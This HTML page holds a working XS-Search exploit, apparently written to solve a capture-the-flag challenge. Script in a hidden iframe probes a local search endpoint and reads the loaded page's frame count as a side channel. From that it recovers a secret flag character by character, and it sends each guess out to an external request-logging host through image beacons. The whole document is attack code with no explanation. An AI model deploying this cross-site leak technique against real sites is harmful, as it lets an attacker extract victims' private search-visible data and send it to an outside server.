<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>XS-Search Site</h1>

<iframe id="iframe" style="display:none;"></iframe>
<script>
    const iframe = document.getElementById("iframe");
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789}";
    let flag = "DH{22d1445ad68e194e044a16dc644g37";

    async function searchChar(data) {
        return new Promise((resolve) => {
            iframe.onload = () => {
                resolve(iframe.contentWindow.frames.length > 0);
            };
            iframe.src = "http://127.0.0.1:8000/search?query=" + encodeURIComponent(data);
        })
    }

    async function findFlag() {
        // 접속 확인 신호
        new Image().src = "https://krxnknf.request.dreamhack.games?start=started";

        while (flag.length <= 40) {
            let found = false;
            for (let i = 0; i < chars.length; i++) {
                if (await searchChar(flag + chars[i])) {
                    flag += chars[i];
                    new Image().src = "https://krxnknf.request.dreamhack.games?found=" + encodeURIComponent(flag);
                    found = true;

                    if (chars[i] === "}") return;
                    break;
                }
            }
            if (!found) {
                new Image().src = "https://krxnknf.request.dreamhack.games?error=notfound";
                break;
            }
        }
    }

    findFlag();
</script>
</body>
</html>
